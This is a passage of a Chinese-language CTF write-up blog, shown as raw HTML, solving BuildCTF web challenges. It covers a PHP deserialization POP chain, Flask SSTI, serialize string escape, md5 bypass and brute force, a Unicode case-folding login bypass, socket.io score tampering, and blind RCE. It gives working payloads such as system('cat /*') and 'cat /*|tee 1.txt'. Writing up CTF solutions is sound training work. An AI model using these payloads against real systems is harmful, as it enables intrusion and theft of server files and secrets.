class="keyword">echo</span> <span class="string">&#x27;I W1ll remember you&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ai</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;No_Need.For.Love&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;No_Need.For.Love&#x27;</span>]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先逆向分析链子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">GaoZhouYue</span>::<span class="title function_ invoke__">_clone</span>()-&gt;<span class="title class_">MyObject</span>::<span class="title function_ invoke__">__invoke</span>()-&gt;hybcx::<span class="title function_ invoke__">__toString</span>()-&gt;<span class="title class_">MyObject</span>::<span class="title function_ invoke__">__wakeup</span>()</span><br></pre></td></tr></table></figure>
<p>最后需要在GaoZhouYue::_clone()里面执行命令，而调用<strong>clone()魔术方法需要在调用clone方法时被调用，在MyObject::</strong>invoke()里面调用了clone，hybcx::<strong>toString()里面出现将类以函数的方法进行调用，MyObject::</strong>wakeup()最后通过比较字符串调用__toString()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyObject</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$NoLove</span>=<span class="string">&quot;Do_You_Want_Fl4g?&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Forgzy</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GaoZhouYue</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Yuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$LastOne</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hybcx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$JiuYue</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Si</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;NoLove=<span class="keyword">new</span> <span class="title function_ invoke__">hybcx</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;NoLove-&gt;Si=<span class="keyword">new</span> <span class="title class_">MyObject</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;NoLove-&gt;Si-&gt;Forgzy=<span class="keyword">new</span> <span class="title class_">GaoZhouYue</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// O:8:&quot;MyObject&quot;:2:&#123;s:6:&quot;NoLove&quot;;O:5:&quot;hybcx&quot;:2:&#123;s:6:&quot;JiuYue&quot;;N;s:2:&quot;Si&quot;;O:8:&quot;MyObject&quot;:2:&#123;s:6:&quot;NoLove&quot;;s:17:&quot;Do_You_Want_Fl4g?&quot;;s:6:&quot;Forgzy&quot;;O:10:&quot;GaoZhouYue&quot;:2:&#123;s:4:&quot;Yuer&quot;;N;s:7:&quot;LastOne&quot;;N;&#125;&#125;&#125;s:6:&quot;Forgzy&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>
<p>最后就通过修改参数使其合法得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">No[Need.For.Love=O:<span class="number">8</span>:<span class="string">&quot;MyObject&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;NoLove&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;hybcx&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;JiuYue&quot;</span>;N;s:<span class="number">2</span>:<span class="string">&quot;Si&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;MyObject&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;NoLove&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;Do_You_Want_Fl4g?&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;Forgzy&quot;</span>;O:<span class="number">10</span>:<span class="string">&quot;GaoZhouYue&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;Yuer&quot;</span>;N;s:<span class="number">7</span>:<span class="string">&quot;LastOne&quot;</span>;N;&#125;&#125;&#125;s:<span class="number">6</span>:<span class="string">&quot;Forgzy&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>post提交</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">y3y4=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /*&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="RedFlag"><a href="#RedFlag" class="headerlink" title="RedFlag"></a>RedFlag</h3><p>ssti</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line">app = flask.<span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">open</span>(__file__).<span class="title function_ invoke__">read</span>()</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/redflag/&lt;path:redflag&gt;&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">redflag</span>(redflag):</span><br><span class="line">    def <span class="title function_ invoke__">safe_jinja</span>(payload):</span><br><span class="line">        payload = payload.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="title function_ invoke__">format</span>(c) <span class="keyword">for</span> c in blacklist])+payload</span><br><span class="line">    <span class="keyword">return</span> flask.<span class="title function_ invoke__">render_template_string</span>(<span class="title function_ invoke__">safe_jinja</span>(redflag))</span><br><span class="line">   </span><br><span class="line"><span class="keyword">return</span> flask.<span class="title function_ invoke__">render_template_string</span>(<span class="title function_ invoke__">safe_jinja</span>(redflag))</span><br></pre></td></tr></table></figure>
<p>这里将redflag进行模块渲染，并且redflag为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/redflag/&lt;path:redflag&gt;</span><br></pre></td></tr></table></figure>
<p>表示我们提交的/redflag/路由下的目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">payload = payload.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.<span class="title function_ invoke__">join</span>([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="title function_ invoke__">format</span>(c) <span class="keyword">for</span> c in blacklist])+payload</span><br></pre></td></tr></table></figure>
<p>这里将()置空,并且将config、self的值变为None</p>
<p>如果直接进行常规的ssti就没有办法实现，但是flag写入了app.config[‘FLAG’]</p>
<p>就可以通过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;<span class="comment">//获取所有的变量</span></span><br></pre></td></tr></table></figure>
<p>最后payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125; <span class="comment">//获得当前app下的config值</span></span><br></pre></td></tr></table></figure>
<h3 id="Cookie-Factory"><a href="#Cookie-Factory" class="headerlink" title="Cookie_Factory"></a>Cookie_Factory</h3><p>题目给出了源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">const http = require(<span class="string">&#x27;http&#x27;</span>).Server(app);</span><br><span class="line"></span><br><span class="line">const port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line">const socketIo = require(<span class="string">&#x27;socket.io&#x27;</span>);</span><br><span class="line">const io = socketIo(http);</span><br><span class="line"></span><br><span class="line">let sessions = &#123;&#125;</span><br><span class="line">let errors = &#123;&#125;</span><br><span class="line"></span><br><span class="line">app.use(express.static(__dirname));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, (req, res) =&gt; &#123;</span><br><span class="line">    res.sendFile(<span class="string">&quot;./index.html&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">io.on(<span class="string">&#x27;connection&#x27;</span>, (socket) =&gt; &#123;</span><br><span class="line">    sessions[socket.<span class="built_in">id</span>] = <span class="number">0</span></span><br><span class="line">    errors[socket.<span class="built_in">id</span>] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    socket.on(<span class="string">&#x27;disconnect&#x27;</span>, () =&gt; &#123;</span><br><span class="line">        console.log(<span class="string">&#x27;user disconnected&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    socket.on(<span class="string">&#x27;chat message&#x27;</span>, (msg) =&gt; &#123;</span><br><span class="line">        socket.emit(<span class="string">&#x27;chat message&#x27;</span>, msg);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    socket.on(<span class="string">&#x27;receivedError&#x27;</span>, (msg) =&gt; &#123;</span><br><span class="line">        sessions[socket.<span class="built_in">id</span>] = errors[socket.<span class="built_in">id</span>]</span><br><span class="line">        socket.emit(<span class="string">&#x27;recievedScore&#x27;</span>, JSON.stringify(&#123;<span class="string">&quot;value&quot;</span>:sessions[socket.<span class="built_in">id</span>]&#125;));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    socket.on(<span class="string">&#x27;click&#x27;</span>, (msg) =&gt; &#123;</span><br><span class="line">        let json = JSON.parse(msg)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sessions[socket.<span class="built_in">id</span>] &gt; <span class="number">1e20</span>) &#123;</span><br><span class="line">            socket.emit(<span class="string">&#x27;recievedScore&#x27;</span>, JSON.stringify(&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;FLAG&quot;</span>&#125;));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (json.value != sessions[socket.<span class="built_in">id</span>]) &#123;</span><br><span class="line">            socket.emit(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;previous value does not match&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        let oldValue = sessions[socket.<span class="built_in">id</span>]</span><br><span class="line">        let newValue = Math.floor(Math.random() * json.power) + <span class="number">1</span> + oldValue</span><br><span class="line"></span><br><span class="line">        sessions[socket.<span class="built_in">id</span>] = newValue</span><br><span class="line">        socket.emit(<span class="string">&#x27;recievedScore&#x27;</span>, JSON.stringify(&#123;<span class="string">&quot;value&quot;</span>:newValue&#125;));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (json.power &gt; <span class="number">10</span>) &#123;</span><br><span class="line">            socket.emit(<span class="string">&#x27;error&#x27;</span>, JSON.stringify(&#123;<span class="string">&quot;value&quot;</span>:oldValue&#125;));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        errors[socket.<span class="built_in">id</span>] = oldValue;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`App server listening on $&#123;port&#125;. (Go to http://localhost:$&#123;port&#125;)`);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>其实也没有什么，主要看到给出flag的地方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (sessions[socket.<span class="built_in">id</span>] &gt; <span class="number">1e20</span>) &#123;</span><br><span class="line">            socket.emit(<span class="string">&#x27;recievedScore&#x27;</span>, JSON.stringify(&#123;<span class="string">&quot;value&quot;</span>:<span class="string">&quot;FLAG&quot;</span>&#125;));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这里如果session的socket.id&gt;1e20就返回flag,但是可以发现为js代码</p>
<p>直接点击抓包就发现，会有一串字符串进行返回</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">42</span>[<span class="string">&quot;click&quot;</span>,<span class="string">&quot;&#123;\&quot;power\&quot;:1,\&quot;value\&quot;:2&#125;&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>这里可以直接通过前端输入函数来实现，将power进行修改，并且</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">socket.<span class="title function_">off</span>(<span class="string">&#x27;error&#x27;</span>); <span class="comment">//直接关闭error函数</span></span><br><span class="line">socket.<span class="title function_">emit</span>(<span class="string">&#x27;click&#x27;</span>, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;power&quot;</span>:<span class="number">1e100</span>, <span class="string">&quot;value&quot;</span>:send.<span class="property">value</span>&#125;)); <span class="comment">//直接修改其值</span></span><br></pre></td></tr></table></figure>
<p>这里也可以通过抓包进行修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">42</span>[<span class="string">&quot;click&quot;</span>,<span class="string">&quot;&#123;\&quot;power\&quot;:1e30,\&quot;value\&quot;:1e30&#125;&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>出现这个，继续放包</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="number">42</span>[<span class="string">&quot;error&quot;</span>,<span class="string">&quot;previous value does not match&quot;</span>]</span><br><span class="line"><span class="number">42</span>[<span class="string">&quot;recievedScore&quot;</span>,<span class="string">&quot;&#123;\&quot;value\&quot;:2.118902775372593e+29&#125;&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>把后面两个进行修改，破坏error函数的修改即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">43</span>[<span class="string">&quot;error&quot;</span>,<span class="string">&quot;&#123;\&quot;value\&quot;:2&#125;&quot;</span>]</span><br><span class="line"><span class="number">43</span>[<span class="string">&quot;receivedError&quot;</span>,<span class="string">&quot;recieved&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>再点击一次就可以得flag</p>
<h3 id="Why-so-serials"><a href="#Why-so-serials" class="headerlink" title="Why_so_serials?"></a>Why_so_serials?</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__); </span><br><span class="line"></span><br><span class="line"><span class="title function_">include</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gotham</span>&#123; </span><br><span class="line">    public $Bruce; </span><br><span class="line">    public $Wayne; </span><br><span class="line">    public $crime=<span class="literal">false</span>; </span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__construct</span>(<span class="params">$Bruce,$Wayne</span>)&#123; </span><br><span class="line">        $this-&gt;<span class="title class_">Bruce</span> = $Bruce; </span><br><span class="line">        $this-&gt;<span class="title class_">Wayne</span> = $Wayne; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_">isset</span>($_GET[<span class="string">&#x27;Bruce&#x27;</span>]) &amp;&amp; <span class="title function_">isset</span>($_GET[<span class="string">&#x27;Wayne&#x27;</span>]))&#123; </span><br><span class="line">    $Bruce = $_GET[<span class="string">&#x27;Bruce&#x27;</span>]; </span><br><span class="line">    $Wayne = $_GET[<span class="string">&#x27;Wayne&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    $city = <span class="keyword">new</span> <span class="title class_">Gotham</span>($Bruce,$Wayne); </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">preg_match</span>(<span class="string">&quot;/joker/&quot;</span>, $Wayne))&#123; </span><br><span class="line">        $serial_city = <span class="title function_">str_replace</span>(<span class="string">&#x27;joker&#x27;</span>, <span class="string">&#x27;batman&#x27;</span>, <span class="title function_">serialize</span>($city)); </span><br><span class="line">        $boom = <span class="title function_">unserialize</span>($serial_city); </span><br><span class="line">        <span class="keyword">if</span>($boom-&gt;crime)&#123; </span><br><span class="line">            echo $flag; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    echo <span class="string">&quot;no crime&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    echo <span class="string">&quot;HAHAHAHA batman can&#x27;t catch me!&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>这个是一个字符串逃逸的题，只需要将crime变为true即可</p>
<p>首先需要先将crime改为true，然后就可以开始尝试字符串逃逸，先看看需要逃逸的字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;s:5:&quot;</span>crime<span class="string">&quot;;b:1;&#125;  //19个字符需要吐</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">class Gotham&#123;</span></span><br><span class="line"><span class="string">    public <span class="subst">$Bruce</span>=&quot;</span>aaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    public <span class="subst">$Wayne</span>=&quot;</span>aaaa<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    public <span class="subst">$crime</span>=true;</span></span><br><span class="line"><span class="string">&#125; </span></span><br><span class="line"><span class="string">for(<span class="subst">$q</span>=0;<span class="subst">$q</span>&lt;19;<span class="subst">$q</span>++)&#123;</span></span><br><span class="line"><span class="string">   echo &quot;</span>joker<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">echo &#x27;&lt;br&gt;&#x27;;</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=new Gotham();</span></span><br><span class="line"><span class="string">echo serialize(<span class="subst">$a</span>);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//jokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjoker</span></span><br><span class="line"><span class="string">?Bruce=aa&amp;Wayne=jokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjokerjoker&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;crime&quot;</span>;b:<span class="number">1</span>;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ez-md5"><a href="#ez-md5" class="headerlink" title="ez_md5"></a>ez_md5</h3><p>开始需要输入sql语句弱密码进行登入  ffifdyop</p>
<p>进去后直接给源码，这里直接给了提示robots，可以先看看robots.txt有什么</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="comment">///robots </span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line"><span class="variable">$Build</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]; </span><br><span class="line"><span class="variable">$CTF</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_REQUEST</span>) &#123;  </span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="variable">$value</span>))   </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;不可以哦！&#x27;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Build</span> != <span class="variable">$CTF</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$Build</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$CTF</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Build_CTF.com&#x27;</span>]) == <span class="string">&quot;3e41f780146b6c246cd49dd296a3da28&quot;</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;再想想&quot;</span>); </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;不是吧这么简单的md5都过不去？&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>robots.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">evel2</span><br><span class="line"><span class="title function_ invoke__">md5</span>(<span class="number">114514</span>xxxxxxx)</span><br></pre></td></tr></table></figure>
<p>这里提示我们去通过爆破，首先第一层可以直接通过数组绕过</p>
<p>下面就是爆破脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">1145140000000</span>;<span class="variable">$a</span>&lt;<span class="number">1145149999999</span>;<span class="variable">$a</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="string">&quot;3e41f780146b6c246cd49dd296a3da28&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="comment">//1145146803531</span></span><br></pre></td></tr></table></figure>
<p>最后考虑参数合法直接提交即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br><span class="line"></span><br><span class="line">Build[CTF.com=<span class="number">1145146803531</span></span><br></pre></td></tr></table></figure>
<h3 id="eazyl0gin"><a href="#eazyl0gin" class="headerlink" title="eazyl0gin"></a>eazyl0gin</h3><p>题目给出源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;/login&#x27;</span>,function(req,res,next)&#123;</span><br><span class="line">  <span class="keyword">var</span> data = &#123;</span><br><span class="line">    username: <span class="title function_ invoke__">String</span>(req.body.username),</span><br><span class="line">    password: <span class="title function_ invoke__">String</span>(req.body.password)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">md5</span> = crypto.<span class="title function_ invoke__">createHash</span>(<span class="string">&#x27;md5&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">flag</span> = process.env.flag</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(data.username.<span class="title function_ invoke__">toLowerCase</span>()===<span class="string">&#x27;buildctf&#x27;</span>)&#123; <span class="comment">//如果将username转为小写强等于buildctf就return</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_ invoke__">render</span>(<span class="string">&#x27;login&#x27;</span>,&#123;<span class="attr">data</span>:<span class="string">&quot;你不许用buildctf账户登陆&quot;</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(data.username.<span class="title function_ invoke__">toUpperCase</span>()!=<span class="string">&#x27;BUILDCTF&#x27;</span>)&#123;<span class="comment">//如果将username转为大写不是弱等于BUILDCTF就return</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_ invoke__">render</span>(<span class="string">&#x27;login&#x27;</span>,&#123;<span class="attr">data</span>:<span class="string">&quot;只有buildctf这一个账户哦~&quot;</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> md5pwd = md5.<span class="title function_ invoke__">update</span>(data.password).<span class="title function_ invoke__">digest</span>(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span>(md5pwd.<span class="title function_ invoke__">toLowerCase</span>()!=<span class="string">&#x27;b26230fafbc4b147ac48217291727c98&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_ invoke__">render</span>(<span class="string">&#x27;login&#x27;</span>,&#123;<span class="attr">data</span>:<span class="string">&quot;密码错误&quot;</span>&#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_ invoke__">render</span>(<span class="string">&#x27;login&#x27;</span>,&#123;<span class="attr">data</span>:flag&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这里其实就主要考一个特性，如果知道了就可以很快写出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在Character.<span class="title function_ invoke__">toUpperCase</span>()函数中，字符ı会转变为I，字符ſ会变为S。</span><br><span class="line"> 在Character.<span class="title function_ invoke__">toLowerCase</span>()函数中，字符İ会转变为i，字符K会转变为k。</span><br><span class="line">buıldctf</span><br></pre></td></tr></table></figure>
<p>密码就直接通过md5解密得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">012346</span></span><br></pre></td></tr></table></figure>
<p>登入即可获取flag</p>
<h3 id="刮刮乐"><a href="#刮刮乐" class="headerlink" title="刮刮乐"></a>刮刮乐</h3><p>如何直接刮到一半时就会提示传参cmd,如果直接进行get传参就有提示</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不对哦，你不是来自baidu.com的自己人哦</span></span><br></pre></td></tr></table></figure>
<p>所以需要添加请求头</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Referer: baidu.com</span><br></pre></td></tr></table></figure>
<p>其实这个是一个无回显rce，打无回显一般就三个思路，首先可以尝试是否可以将命令结果写入文件进行回显，否则出网就可以通过反弹shell来查看结果，还可以通过内存马来回显</p>
<p>这个题就可以通过第一种方法，并且环境不出网</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls&gt;&gt;<span class="number">1</span>.txt <span class="comment">//这个在这个题是无法写入的</span></span><br><span class="line">cat <span class="comment">/*|tee 1.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="sub"><a href="#sub" class="headerlink" title="sub"></a>sub</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, jsonify, render_template, request, abort, redirect, url_for, flash, make_response</span><br><span class="line"><span class="keyword">from</span> werkzeug.security <span class="keyword">import</span> generate_password_hash, check_password_hash</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;BuildCTF&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;JWT_SECRET_KEY&#x27;</span>] = <span class="string">&#x27;BuildCTF&#x27;</span></span><br><span class="line"></span><br><span class="line">DOCUMENT_DIR = os.path.abspath(<span class="string">&#x27;src/docs&#x27;</span>)</span><br><span class="line">users = &#123;&#125;</span><br><span class="line"></span><br><span class="line">messages = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span 